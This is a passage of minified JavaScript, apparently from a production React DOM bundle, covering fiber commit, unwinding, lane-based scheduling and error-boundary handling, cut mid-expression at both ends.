$e(e.type)&&tl(),Re(e),null;case 19:if(X(ne),s=e.memoizedState,s===null)return Re(e),null;if(r=(e.flags&128)!==0,o=s.rendering,o===null)if(r)Ai(s,!1);else{if(pe!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(o=al(t),o!==null){for(e.flags|=128,Ai(s,!1),r=o.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),e.subtreeFlags=0,r=n,n=e.child;n!==null;)s=n,t=r,s.flags&=14680066,o=s.alternate,o===null?(s.childLanes=0,s.lanes=t,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=o.childLanes,s.lanes=o.lanes,s.child=o.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=o.memoizedProps,s.memoizedState=o.memoizedState,s.updateQueue=o.updateQueue,s.type=o.type,t=o.dependencies,s.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return K(ne,ne.current&1|2),e.child}t=t.sibling}s.tail!==null&&ue()>si&&(e.flags|=128,r=!0,Ai(s,!1),e.lanes=4194304)}else{if(!r)if(t=al(o),t!==null){if(e.flags|=128,r=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),Ai(s,!0),s.tail===null&&s.tailMode==="hidden"&&!o.alternate&&!te)return Re(e),null}else 2*ue()-s.renderingStartTime>si&&n!==1073741824&&(e.flags|=128,r=!0,Ai(s,!1),e.lanes=4194304);s.isBackwards?(o.sibling=e.child,e.child=o):(n=s.last,n!==null?n.sibling=o:e.child=o,s.last=o)}return s.tail!==null?(e=s.tail,s.rendering=e,s.tail=e.sibling,s.renderingStartTime=ue(),e.sibling=null,n=ne.current,K(ne,r?n&1|2:n&1),e):(Re(e),null);case 22:case 23:return Pd(),r=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==r&&(e.flags|=8192),r&&e.mode&1?Ke&1073741824&&(Re(e),e.subtreeFlags&6&&(e.flags|=8192)):Re(e),null;case 24:return null;case 25:return null}throw Error(C(156,e.tag))}function WE(t,e){switch(ud(e),e.tag){case 1:return $e(e.type)&&tl(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return ri(),X(We),X(xe),vd(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return _d(e),null;case 13:if(X(ne),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(C(340));ti()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return X(ne),null;case 4:return ri(),null;case 10:return fd(e.type._context),null;case 22:case 23:return Pd(),null;case 24:return null;default:return null}}var Eo=!1,Ne=!1,$E=typeof WeakSet=="function"?WeakSet:Set,R=null;function Mr(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){oe(t,e,r)}else n.current=null}function oc(t,e,n){try{n()}catch(r){oe(t,e,r)}}var $f=!1;function VE(t,e){if(Wu=Xo,t=kg(),ld(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{n.nodeType,s.nodeType}catch{n=null;break e}var o=0,l=-1,a=-1,u=0,c=0,d=t,h=null;t:for(;;){for(var m;d!==n||i!==0&&d.nodeType!==3||(l=o+i),d!==s||r!==0&&d.nodeType!==3||(a=o+r),d.nodeType===3&&(o+=d.nodeValue.length),(m=d.firstChild)!==null;)h=d,d=m;for(;;){if(d===t)break t;if(h===n&&++u===i&&(l=o),h===s&&++c===r&&(a=o),(m=d.nextSibling)!==null)break;d=h,h=d.parentNode}d=m}n=l===-1||a===-1?null:{start:l,end:a}}else n=null}n=n||{start:0,end:0}}else n=null;for($u={focusedElem:t,selectionRange:n},Xo=!1,R=e;R!==null;)if(e=R,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,R=t;else for(;R!==null;){e=R;try{var _=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(_!==null){var v=_.memoizedProps,w=_.memoizedState,p=e.stateNode,f=p.getSnapshotBeforeUpdate(e.elementType===e.type?v:ut(e.type,v),w);p.__reactInternalSnapshotBeforeUpdate=f}break;case 3:var g=e.stateNode.containerInfo;g.nodeType===1?g.textContent="":g.nodeType===9&&g.documentElement&&g.removeChild(g.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(C(163))}}catch(y){oe(e,e.return,y)}if(t=e.sibling,t!==null){t.return=e.return,R=t;break}R=e.return}return _=$f,$f=!1,_}function Ji(t,e,n){var r=e.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&t)===t){var s=i.destroy;i.destroy=void 0,s!==void 0&&oc(e,n,s)}i=i.next}while(i!==r)}}function ta(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var r=n.create;n.destroy=r()}n=n.next}while(n!==e)}}function lc(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function S_(t){var e=t.alternate;e!==null&&(t.alternate=null,S_(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[St],delete e[_s],delete e[Gu],delete e[RE],delete e[NE])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function T_(t){return t.tag===5||t.tag===3||t.tag===4}function Vf(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||T_(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function ac(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=el));else if(r!==4&&(t=t.child,t!==null))for(ac(t,e,n),t=t.sibling;t!==null;)ac(t,e,n),t=t.sibling}function uc(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(r!==4&&(t=t.child,t!==null))for(uc(t,e,n),t=t.sibling;t!==null;)uc(t,e,n),t=t.sibling}var Ee=null,ct=!1;function Jt(t,e,n){for(n=n.child;n!==null;)I_(t,e,n),n=n.sibling}function I_(t,e,n){if(It&&typeof It.onCommitFiberUnmount=="function")try{It.onCommitFiberUnmount(Gl,n)}catch{}switch(n.tag){case 5:Ne||Mr(n,e);case 6:var r=Ee,i=ct;Ee=null,Jt(t,e,n),Ee=r,ct=i,Ee!==null&&(ct?(t=Ee,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):Ee.removeChild(n.stateNode));break;case 18:Ee!==null&&(ct?(t=Ee,n=n.stateNode,t.nodeType===8?$a(t.parentNode,n):t.nodeType===1&&$a(t,n),hs(t)):$a(Ee,n.stateNode));break;case 4:r=Ee,i=ct,Ee=n.stateNode.containerInfo,ct=!0,Jt(t,e,n),Ee=r,ct=i;break;case 0:case 11:case 14:case 15:if(!Ne&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var s=i,o=s.destroy;s=s.tag,o!==void 0&&(s&2||s&4)&&oc(n,e,o),i=i.next}while(i!==r)}Jt(t,e,n);break;case 1:if(!Ne&&(Mr(n,e),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(l){oe(n,e,l)}Jt(t,e,n);break;case 21:Jt(t,e,n);break;case 22:n.mode&1?(Ne=(r=Ne)||n.memoizedState!==null,Jt(t,e,n),Ne=r):Jt(t,e,n);break;default:Jt(t,e,n)}}function qf(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new $E),e.forEach(function(r){var i=eC.bind(null,t,r);n.has(r)||(n.add(r),r.then(i,i))})}}function at(t,e){var n=e.deletions;if(n!==null)for(var r=0;r<n.length;r++){var i=n[r];try{var s=t,o=e,l=o;e:for(;l!==null;){switch(l.tag){case 5:Ee=l.stateNode,ct=!1;break e;case 3:Ee=l.stateNode.containerInfo,ct=!0;break e;case 4:Ee=l.stateNode.containerInfo,ct=!0;break e}l=l.return}if(Ee===null)throw Error(C(160));I_(s,o,i),Ee=null,ct=!1;var a=i.alternate;a!==null&&(a.return=null),i.return=null}catch(u){oe(i,e,u)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)k_(e,t),e=e.sibling}function k_(t,e){var n=t.alternate,r=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(at(e,t),Et(t),r&4){try{Ji(3,t,t.return),ta(3,t)}catch(v){oe(t,t.return,v)}try{Ji(5,t,t.return)}catch(v){oe(t,t.return,v)}}break;case 1:at(e,t),Et(t),r&512&&n!==null&&Mr(n,n.return);break;case 5:if(at(e,t),Et(t),r&512&&n!==null&&Mr(n,n.return),t.flags&32){var i=t.stateNode;try{as(i,"")}catch(v){oe(t,t.return,v)}}if(r&4&&(i=t.stateNode,i!=null)){var s=t.memoizedProps,o=n!==null?n.memoizedProps:s,l=t.type,a=t.updateQueue;if(t.updateQueue=null,a!==null)try{l==="input"&&s.type==="radio"&&s.name!=null&&Gm(i,s),bu(l,o);var u=bu(l,s);for(o=0;o<a.length;o+=2){var c=a[o],d=a[o+1];c==="style"?Jm(i,d):c==="dangerouslySetInnerHTML"?Qm(i,d):c==="children"?as(i,d):Kc(i,c,d,u)}switch(l){case"input":Nu(i,s);break;case"textarea":Km(i,s);break;case"select":var h=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var m=s.value;m!=null?zr(i,!!s.multiple,m,!1):h!==!!s.multiple&&(s.defaultValue!=null?zr(i,!!s.multiple,s.defaultValue,!0):zr(i,!!s.multiple,s.multiple?[]:"",!1))}i[_s]=s}catch(v){oe(t,t.return,v)}}break;case 6:if(at(e,t),Et(t),r&4){if(t.stateNode===null)throw Error(C(162));i=t.stateNode,s=t.memoizedProps;try{i.nodeValue=s}catch(v){oe(t,t.return,v)}}break;case 3:if(at(e,t),Et(t),r&4&&n!==null&&n.memoizedState.isDehydrated)try{hs(e.containerInfo)}catch(v){oe(t,t.return,v)}break;case 4:at(e,t),Et(t);break;case 13:at(e,t),Et(t),i=t.child,i.flags&8192&&(s=i.memoizedState!==null,i.stateNode.isHidden=s,!s||i.alternate!==null&&i.alternate.memoizedState!==null||(Rd=ue())),r&4&&qf(t);break;case 22:if(c=n!==null&&n.memoizedState!==null,t.mode&1?(Ne=(u=Ne)||c,at(e,t),Ne=u):at(e,t),Et(t),r&8192){if(u=t.memoizedState!==null,(t.stateNode.isHidden=u)&&!c&&t.mode&1)for(R=t,c=t.child;c!==null;){for(d=R=c;R!==null;){switch(h=R,m=h.child,h.tag){case 0:case 11:case 14:case 15:Ji(4,h,h.return);break;case 1:Mr(h,h.return);var _=h.stateNode;if(typeof _.componentWillUnmount=="function"){r=h,n=h.return;try{e=r,_.props=e.memoizedProps,_.state=e.memoizedState,_.componentWillUnmount()}catch(v){oe(r,n,v)}}break;case 5:Mr(h,h.return);break;case 22:if(h.memoizedState!==null){Kf(d);continue}}m!==null?(m.return=h,R=m):Kf(d)}c=c.sibling}e:for(c=null,d=t;;){if(d.tag===5){if(c===null){c=d;try{i=d.stateNode,u?(s=i.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(l=d.stateNode,a=d.memoizedProps.style,o=a!=null&&a.hasOwnProperty("display")?a.display:null,l.style.display=Xm("display",o))}catch(v){oe(t,t.return,v)}}}else if(d.tag===6){if(c===null)try{d.stateNode.nodeValue=u?"":d.memoizedProps}catch(v){oe(t,t.return,v)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===t)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===t)break e;for(;d.sibling===null;){if(d.return===null||d.return===t)break e;c===d&&(c=null),d=d.return}c===d&&(c=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:at(e,t),Et(t),r&4&&qf(t);break;case 21:break;default:at(e,t),Et(t)}}function Et(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(T_(n)){var r=n;break e}n=n.return}throw Error(C(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(as(i,""),r.flags&=-33);var s=Vf(t);uc(t,s,i);break;case 3:case 4:var o=r.stateNode.containerInfo,l=Vf(t);ac(t,l,o);break;default:throw Error(C(161))}}catch(a){oe(t,t.return,a)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function qE(t,e,n){R=t,R_(t)}function R_(t,e,n){for(var r=(t.mode&1)!==0;R!==null;){var i=R,s=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||Eo;if(!o){var l=i.alternate,a=l!==null&&l.memoizedState!==null||Ne;l=Eo;var u=Ne;if(Eo=o,(Ne=a)&&!u)for(R=i;R!==null;)o=R,a=o.child,o.tag===22&&o.memoizedState!==null?Yf(i):a!==null?(a.return=o,R=a):Yf(i);for(;s!==null;)R=s,R_(s),s=s.sibling;R=i,Eo=l,Ne=u}Gf(t)}else i.subtreeFlags&8772&&s!==null?(s.return=i,R=s):Gf(t)}}function Gf(t){for(;R!==null;){var e=R;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Ne||ta(5,e);break;case 1:var r=e.stateNode;if(e.flags&4&&!Ne)if(n===null)r.componentDidMount();else{var i=e.elementType===e.type?n.memoizedProps:ut(e.type,n.memoizedProps);r.componentDidUpdate(i,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=e.updateQueue;s!==null&&xf(e,s,r);break;case 3:var o=e.updateQueue;if(o!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}xf(e,o,n)}break;case 5:var l=e.stateNode;if(n===null&&e.flags&4){n=l;var a=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":a.autoFocus&&n.focus();break;case"img":a.src&&(n.src=a.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var u=e.alternate;if(u!==null){var c=u.memoizedState;if(c!==null){var d=c.dehydrated;d!==null&&hs(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(C(163))}Ne||e.flags&512&&lc(e)}catch(h){oe(e,e.return,h)}}if(e===t){R=null;break}if(n=e.sibling,n!==null){n.return=e.return,R=n;break}R=e.return}}function Kf(t){for(;R!==null;){var e=R;if(e===t){R=null;break}var n=e.sibling;if(n!==null){n.return=e.return,R=n;break}R=e.return}}function Yf(t){for(;R!==null;){var e=R;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{ta(4,e)}catch(a){oe(e,n,a)}break;case 1:var r=e.stateNode;if(typeof r.componentDidMount=="function"){var i=e.return;try{r.componentDidMount()}catch(a){oe(e,i,a)}}var s=e.return;try{lc(e)}catch(a){oe(e,s,a)}break;case 5:var o=e.return;try{lc(e)}catch(a){oe(e,o,a)}}}catch(a){oe(e,e.return,a)}if(e===t){R=null;break}var l=e.sibling;if(l!==null){l.return=e.return,R=l;break}R=e.return}}var GE=Math.ceil,dl=Kt.ReactCurrentDispatcher,Id=Kt.ReactCurrentOwner,it=Kt.ReactCurrentBatchConfig,B=0,we=null,ce=null,Se=0,Ke=0,Ur=An(0),pe=0,Ss=null,nr=0,na=0,kd=0,Zi=null,je=null,Rd=0,si=1/0,At=null,hl=!1,cc=null,vn=null,Co=!1,dn=null,fl=0,es=0,dc=null,Fo=-1,jo=0;function Le(){return B&6?ue():Fo!==-1?Fo:Fo=ue()}function yn(t){return t.mode&1?B&2&&Se!==0?Se&-Se:xE.transition!==null?(jo===0&&(jo=cg()),jo):(t=$,t!==0||(t=window.event,t=t===void 0?16:_g(t.type)),t):1}function _t(t,e,n,r){if(50<es)throw es=0,dc=null,Error(C(185));zs(t,n,r),(!(B&2)||t!==we)&&(t===we&&(!(B&2)&&(na|=n),pe===4&&rn(t,Se)),Ve(t,r),n===1&&B===0&&!(e.mode&1)&&(si=ue()+500,Jl&&On()))}function Ve(t,e){var n=t.callbackNode;x0(t,e);var r=Qo(t,t===we?Se:0);if(r===0)n!==null&&rf(n),t.callbackNode=null,t.callbackPriority=0;else if(e=r&-r,t.callbackPriority!==e){if(n!=null&&rf(n),e===1)t.tag===0?PE(Qf.bind(null,t)):Mg(Qf.bind(null,t)),IE(function(){!(B&6)&&On()}),n=null;else{switch(dg(r)){case 1:n=Zc;break;case 4:n=ag;break;case 16:n=Yo;break;case 536870912:n=ug;break;default:n=Yo}n=D_(n,N_.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function N_(t,e){if(Fo=-1,jo=0,B&6)throw Error(C(327));var n=t.callbackNode;if(Vr()&&t.callbackNode!==n)return null;var r=Qo(t,t===we?Se:0);if(r===0)return null;if(r&30||r&t.expiredLanes||e)e=pl(t,r);else{e=r;var i=B;B|=2;var s=x_();(we!==t||Se!==e)&&(At=null,si=ue()+500,Gn(t,e));do try{QE();break}catch(l){P_(t,l)}while(1);hd(),dl.current=s,B=i,ce!==null?e=0:(we=null,Se=0,e=pe)}if(e!==0){if(e===2&&(i=Fu(t),i!==0&&(r=i,e=hc(t,i))),e===1)throw n=Ss,Gn(t,0),rn(t,r),Ve(t,ue()),n;if(e===6)rn(t,r);else{if(i=t.current.alternate,!(r&30)&&!KE(i)&&(e=pl(t,r),e===2&&(s=Fu(t),s!==0&&(r=s,e=hc(t,s))),e===1))throw n=Ss,Gn(t,0),rn(t,r),Ve(t,ue()),n;switch(t.finishedWork=i,t.finishedLanes=r,e){case 0:case 1:throw Error(C(345));case 2:Un(t,je,At);break;case 3:if(rn(t,r),(r&130023424)===r&&(e=Rd+500-ue(),10<e)){if(Qo(t,0)!==0)break;if(i=t.suspendedLanes,(i&r)!==r){Le(),t.pingedLanes|=t.suspendedLanes&i;break}t.timeoutHandle=qu(Un.bind(null,t,je,At),e);break}Un(t,je,At);break;case 4:if(rn(t,r),(r&4194240)===r)break;for(e=t.eventTimes,i=-1;0<r;){var o=31-gt(r);s=1<<o,o=e[o],o>i&&(i=o),r&=~s}if(r=i,r=ue()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*GE(r/1960))-r,10<r){t.timeoutHandle=qu(Un.bind(null,t,je,At),r);break}Un(t,je,At);break;case 5:Un(t,je,At);break;default:throw Error(C(329))}}}return Ve(t,ue()),t.callbackNode===n?N_.bind(null,t):null}function hc(t,e){var n=Zi;return t.current.memoizedState.isDehydrated&&(Gn(t,e).flags|=256),t=pl(t,e),t!==2&&(e=je,je=n,e!==null&&fc(e)),t}function fc(t){je===null?je=t:je.push.apply(je,t)}function KE(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var i=n[r],s=i.getSnapshot;i=i.value;try{if(!yt(s(),i))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function rn(t,e){for(e&=~kd,e&=~na,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-gt(e),r=1<<n;t[n]=-1,e&=~r}}function Qf(t){if(B&6)throw Error(C(327));Vr();var e=Qo(t,0);if(!(e&1))return Ve(t,ue()),null;var n=pl(t,e);if(t.tag!==0&&n===2){var r=Fu(t);r!==0&&(e=r,n=hc(t,r))}if(n===1)throw n=Ss,Gn(t,0),rn(t,e),Ve(t,ue()),n;if(n===6)throw Error(C(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,Un(t,je,At),Ve(t,ue()),null}function Nd(t,e){var n=B;B|=1;try{return t(e)}finally{B=n,B===0&&(si=ue()+500,Jl&&On())}}function rr(t){dn!==null&&dn.tag===0&&!(B&6)&&Vr();var e=B;B|=1;var n=it.transition,r=$;try{if(it.transition=null,$=1,t)return t()}finally{$=r,it.transition=n,B=e,!(B&6)&&On()}}function Pd(){Ke=Ur.current,X(Ur)}function Gn(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,TE(n)),ce!==null)for(n=ce.return;n!==null;){var r=n;switch(ud(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&tl();break;case 3:ri(),X(We),X(xe),vd();break;case 5:_d(r);break;case 4:ri();break;case 13:X(ne);break;case 19:X(ne);break;case 10:fd(r.type._context);break;case 22:case 23:Pd()}n=n.return}if(we=t,ce=t=wn(t.current,null),Se=Ke=e,pe=0,Ss=null,kd=na=nr=0,je=Zi=null,Hn!==null){for(e=0;e<Hn.length;e++)if(n=Hn[e],r=n.interleaved,r!==null){n.interleaved=null;var i=r.next,s=n.pending;if(s!==null){var o=s.next;s.next=i,r.next=o}n.pending=r}Hn=null}return t}function P_(t,e){do{var n=ce;try{if(hd(),Do.current=cl,ul){for(var r=re.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}ul=!1}if(tr=0,_e=he=re=null,Xi=!1,ws=0,Id.current=null,n===null||n.return===null){pe=1,Ss=e,ce=null;break}e:{var s=t,o=n.return,l=n,a=e;if(e=Se,l.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){var u=a,c=l,d=c.tag;if(!(c.mode&1)&&(d===0||d===11||d===15)){var h=c.alternate;h?(c.updateQueue=h.updateQueue,c.memoizedState=h.memoizedState,c.lanes=h.lanes):(c.updateQueue=null,c.memoizedState=null)}var m=Uf(o);if(m!==null){m.flags&=-257,Ff(m,o,l,s,e),m.mode&1&&Mf(s,u,e),e=m,a=u;var _=e.updateQueue;if(_===null){var v=new Set;v.add(a),e.updateQueue=v}else _.add(a);break e}else{if(!(e&1)){Mf(s,u,e),xd();break e}a=Error(C(426))}}else if(te&&l.mode&1){var w=Uf(o);if(w!==null){!(w.flags&65536)&&(w.flags|=256),Ff(w,o,l,s,e),cd(ii(a,l));break e}}s=a=ii(a,l),pe!==4&&(pe=2),Zi===null?Zi=[s]:Zi.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,e&=-e,s.lanes|=e;var p=h_(s,a,e);Pf(s,p);break e;case 1:l=a;var f=s.type,g=s.stateNode;if(!(s.flags&128)&&(typeof f.getDerivedStateFromError=="function"||g!==null&&typeof g.componentDidCatch=="function"&&(vn===null||!vn.has(g)))){s.flags|=65536,e&=-e,s.lanes|=e;var y=f_(s,l,e);Pf(s,y);break e}}s=s.return}while(s!==null)}O_(n)}catch(T){e=T,ce===n&&n!==null&&(ce=n=n.return);continue}break}while(1)}function x_(){var t=dl.current;return dl.current=cl,t===null?cl:t}function xd(){(pe===0||pe===3||pe===2)&&(pe=4),we===null||!(nr&268435455)&&!(na&268435455)||rn(we,Se)}function pl(t,e){var n=B;B|=2;var r=x_();(we!==t||Se!==e)&&(At=null,Gn(t,e));do try{YE();break}catch(i){P_(t,i)}while(1);if(hd(),B=n,dl.current=r,ce!==null)throw Error(C(261));return we=null,Se=0,pe}function YE(){for(;ce!==null;)A_(ce)}function QE(){for(;ce!==null&&!E0();)A_(ce)}function A_(t){var e=L_(t.alternate,t,Ke);t.memoizedProps=t.pendingProps,e===null?O_(t):ce=e,Id.current=null}function O_(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=WE(n,e),n!==null){n.flags&=32767,ce=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{pe=6,ce=null;return}}else if(n=HE(n,e,Ke),n!==null){ce=n;return}if(e=e.sibling,e!==null){ce=e;return}ce=e=t}while(e!==null);pe===0&&(pe=5)}function Un(t,e,n){var r=$,i=it.transition;try{it.transition=null,$=1,XE(t,e,n,r)}finally{it.transition=i,$=r}return null}function XE(t,e,n,r){do Vr();while(dn!==null);if(B&6)throw Error(C(327));n=t.finishedWork;var i=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error(C(177));t.callbackNode=null,t.callbackPriority=0;var s=n.lanes|n.childLanes;if(A0(t,s),t===we&&(ce=we=null,Se=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||Co||(Co=!0,D_(Yo,function(){return Vr(),null})),s=(n.flags&15990)!==0,n.subtreeFlags&15990||s){s=it.transition,it.transition=null;var o=$;$=1;var l=B;B|=4,Id.current=null,VE(t,n),k_(n,t),_E($u),Xo=!!Wu,$u=Wu=null,t.current=n,qE(n),C0(),B=l,$=o,it.transition=s}else t.current=n;if(Co&&(Co=!1,dn=t,fl=i),s=t.pendingLanes,s===0&&(vn=null),I0(n.stateNode),Ve(t,ue()),e!==null)for(r=t.onRecoverableError,n=0;n<e.length;n++)i=e[n],r(i.value,{componentStack:i.stack,digest:i.digest});if(hl)throw hl=!1,t=cc,cc=null,t;return fl&1&&t.tag!==0&&Vr(),s=t.pendingLanes,s&1?t===dc?es++:(es=0,dc=t):es=0,On(),null}function Vr(){if(dn!==null){var t=dg(fl),e=it.transition,n=$;try{if(it.transition=null,$=16>t?16:t,dn===null)var r=!1;else{if(t=dn,dn=null,fl=0,B&6)throw Error(C(331));var i=B;for(B|=4,R=t.current;R!==null;){var s=R,o=s.child;if(R.flags&16){var l=s.deletions;if(l!==null){for(var a=0;a<l.length;a++){var u=l[a];for(R=u;R!==null;){var c=R;switch(c.tag){case 0:case 11:case 15:Ji(8,c,s)}var d=c.child;if(d!==null)d.return=c,R=d;else for(;R!==null;){c=R;var h=c.sibling,m=c.return;if(S_(c),c===u){R=null;break}if(h!==null){h.return=m,R=h;break}R=m}}}var _=s.alternate;if(_!==null){var v=_.child;if(v!==null){_.child=null;do{var w=v.sibling;v.sibling=null,v=w}while(v!==null)}}R=s}}if(s.subtreeFlags&2064&&o!==null)o.return=s,R=o;else e:for(;R!==null;){if(s=R,s.flags&2048)switch(s.tag){case 0:case 11:case 15:Ji(9,s,s.return)}var p=s.sibling;if(p!==null){p.return=s.return,R=p;break e}R=s.return}}var f=t.current;for(R=f;R!==null;){o=R;var g=o.child;if(o.subtreeFlags&2064&&g!==null)g.return=o,R=g;else e:for(o=f;R!==null;){if(l=R,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:ta(9,l)}}catch(T){oe(l,l.return,T)}if(l===o){R=null;break e}var y=l.sibling;if(y!==null){y.return=l.return,R=y;break e}R=l.return}}if(B=i,On(),It&&typeof It.onPostCommitFiberRoot=="function")try{It.onPostCommitFiberRoot(Gl,t)}catch{}r=!0}return r}finally{$=n,it.transition=e}}return!1}function Xf(t,e,n){e=ii(n,e),e=h_(t,e,1),t=_n(t,e,1),e=Le(),t!==null&&(zs(t,1,e),Ve(t,e))}function oe(t,e,n){if(t.tag===3)Xf(t,t,n);else for(;e!==null;){if(e.tag===3){Xf(e,t,n);break}else if(e.tag===1){var r=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(vn===null||!vn.has(r))){t=ii(n,t),t=f_(e,t,1),e=_n(e,t,1),t=Le(),e!==null&&(zs(e,1,t),Ve(e,t));break}}e=e.return}}function JE(t,e,n){var r=t.pingCache;r!==null&&r.delete(e),e=Le(),t.pingedLanes|=t.suspendedLanes&n,we===t&&(Se&n)===n&&(pe===4||pe===3&&(Se&130023424)===Se&&500>ue()-Rd?Gn(t,0):kd|=n),Ve(t,e)}function b_(t,e){e===0&&(t.mode&1?(e=ho,ho<<=1,!(ho&130023424)&&(ho=4194304)):e=1);var n=Le();t=Wt(t,e),t!==null&&(zs(t,e,n),Ve(t,n))}function ZE(t){var e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),b_(t,n)}function eC(t,e){var n=0;switch(t.tag){case 13:var r=t.stateNode,i=t.memoizedState;i!==null&&(n=i.retryLane);break;case 19:r=t.stateNode;break;default:throw Error(C(314))}r!==null&&r.delete(e),b_(t,n)}var L_;L_=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||We.current)ze=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return ze=!1,BE(t,e,n);ze=!!(t.flags&131072)}else ze=!1,te&&e.flags&1048576&&Ug(e,il,e.index);switch(e.lanes=0,e.tag){case 2:var r=e.type;Uo(t,e),t=e.pendingProps;var i=ei(e,xe.current);$r(e,n),i=wd(null,e,r,t,i,n);var s=Ed();return e.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,$e(r)?(s=!0,nl(e)):s=!1,e.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,md(e),i.updater=Zl,e.stateNode=i,i._reactInternals=e,Zu(e,r,t,n),e=nc(null,e,r,!0,s,n)):(e.tag=0,te&&s&&ad(e),be(null,e,i,n),e=e.child),e;case 